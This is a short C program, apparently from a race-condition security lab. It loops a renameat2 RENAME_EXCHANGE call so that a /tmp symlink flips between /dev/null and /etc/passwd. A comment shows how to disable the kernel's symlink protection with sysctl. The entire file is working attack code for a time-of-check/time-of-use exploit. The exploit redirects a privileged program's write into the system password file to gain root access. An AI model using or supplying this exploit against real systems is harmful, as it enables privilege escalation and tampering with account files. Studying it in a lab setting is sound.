#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// sudo sysctl -w fs.protected_symlinks=0
int main()
{
    unsigned int flags = RENAME_EXCHANGE;

    unlink("/tmp/X");
    symlink("/dev/null", "/tmp/X");

    unlink("/tmp/A");
    symlink("/etc/passwd", "/tmp/A");

    while(1)
    {
        syscall(SYS_renameat2, 0, "/tmp/X", 0, "/tmp/A", flags);
        usleep(1000);
    }

    return 0;
}

